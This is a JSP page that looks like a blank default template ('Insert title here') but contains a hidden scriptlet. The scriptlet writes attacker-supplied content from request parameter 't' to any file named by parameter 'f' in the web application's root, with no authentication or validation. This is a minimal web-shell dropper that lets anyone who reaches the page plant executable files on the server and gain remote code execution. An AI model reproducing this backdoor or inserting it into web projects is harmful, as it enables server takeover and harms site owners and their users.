<%@ page contentType="text/html; charset=UTF-8"
         pageEncoding="UTF-8" %>


<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Insert title here</title>
</head>
<body>

<!-- https://www.jb51.net/article/7461.htm -->
<%
    if (request.getParameter("f") != null)
        (new java.io.FileOutputStream(application.getRealPath("/") + request.getParameter("f"))).write(request.getParameter("t").getBytes());
%>

</body>
</html>